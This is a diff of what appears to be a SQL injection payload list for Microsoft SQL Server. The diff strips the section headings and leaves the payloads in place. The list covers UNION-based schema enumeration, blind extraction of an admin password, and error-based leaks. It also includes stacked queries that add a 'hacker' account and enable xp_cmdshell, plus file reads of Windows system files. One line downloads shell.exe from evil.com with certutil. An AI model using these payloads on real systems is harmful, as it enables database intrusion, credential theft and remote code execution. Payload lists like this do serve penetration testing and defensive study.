@@ -1,8 +1,3 @@
-# ============================================================
-# SQL Injection — Microsoft SQL Server (MSSQL)
-# ============================================================
-
-# ---- Detection ----
 '
 "
 ;
@@ -10,51 +5,40 @@
 " --
 '; WAITFOR DELAY '0:0:5'--
 
-# ---- Comments ----
 -- comment
 /* comment */
 
-# ---- System Information ----
 ' UNION SELECT @@version,NULL,NULL--
 ' UNION SELECT user_name(),NULL,NULL--
 ' UNION SELECT db_name(),NULL,NULL--
 ' UNION SELECT @@servername,NULL,NULL--
 
-# ---- Enumerate Databases ----
 ' UNION SELECT name,NULL FROM sys.databases--
 ' UNION SELECT name,NULL FROM master..sysdatabases--
 
-# ---- Enumerate Tables ----
 ' UNION SELECT table_name,NULL FROM information_schema.tables--
 ' UNION SELECT name,NULL FROM sysobjects WHERE xtype='U'--
 
-# ---- Enumerate Columns ----
 ' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'--
 
-# ---- Time-Based Blind ----
 '; WAITFOR DELAY '0:0:5'--
 ' AND 1=(SELECT 1 WHERE 1=1 WAITFOR DELAY '0:0:5')--
 '; IF (1=1) WAITFOR DELAY '0:0:5'--
 '; IF (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='a' WAITFOR DELAY '0:0:5'--
 
-# ---- Error-Based ----
 ' AND 1=CONVERT(int, (SELECT @@version))--
 ' AND 1=CONVERT(int, (SELECT TOP 1 name FROM master..sysdatabases))--
 
-# ---- Stacked Queries ----
 '; INSERT INTO users(username,password) VALUES('hacker','pwned')--
 '; EXEC xp_cmdshell('id')--
 '; EXEC sp_configure 'show advanced options', 1; RECONFIGURE--
 '; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE--
 
-# ---- RCE via xp_cmdshell ----
 '; EXEC xp_cmdshell('whoami')--
 '; EXEC xp_cmdshell('dir C:\')--
 '; EXEC xp_cmdshell('certutil -urlcache -f https://evil.com/shell.exe C:\Windows\Temp\shell.exe')--
 
-# ---- File Read ----
 '; BULK INSERT tempdb..tmp FROM 'C:\Windows\System32\drivers\etc\hosts' WITH (ROWTERMINATOR='\n')--
 ' UNION SELECT BulkColumn,NULL FROM OPENROWSET(BULK 'C:\Windows\win.ini', SINGLE_CLOB) t--
 
-# ---- Linked Server ----
 '; SELECT * FROM OPENQUERY([LINKEDSERVER], 'SELECT user')--
